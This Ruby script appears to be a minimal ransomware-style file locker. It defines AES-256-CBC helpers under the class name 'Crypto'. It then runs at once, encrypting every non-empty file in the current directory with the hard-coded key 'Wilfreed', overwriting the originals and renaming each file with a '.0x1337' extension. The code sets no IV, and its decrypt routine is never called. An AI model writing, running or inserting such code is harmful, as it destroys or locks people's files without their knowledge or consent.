require 'openssl'
require 'digest'
require 'pathname'

class Crypto
    def self.aes256_encrypt(key, data)
        keyCiph = Digest::SHA256.digest(key)
        cipher = OpenSSL::Cipher::AES.new('256-CBC')
        cipher.encrypt
        cipher.key = keyCiph
        return cipher.update(data) + cipher.final
    end

    def self.aes256_decrypt(key, data)
        decipher = OpenSSL::Cipher::AES.new('256-CBC')
        decipher.decrypt
        decipher.key = Digest::SHA256.digest(key)
        decipher.update(data) + decipher.final
    end

    def self.encrypt_file(file)
        file_content = File.read(file)
        File.open(file, "w") do |f|
            f.write(self.aes256_encrypt("Wilfreed",file_content))
        end
        Pathname.glob(file).each do |p|
            p.rename p.sub_ext(".0x1337")
        end
    end

    def self.encrypt_current_folders
        Dir.entries(Dir.pwd).each do |file|
            if ((File.directory?(file) == false) && (File.zero?(file) == false) && (file.nil? == false))
                puts file
                self.encrypt_file(file)
            end
        end
    end
end


Crypto.encrypt_current_folders
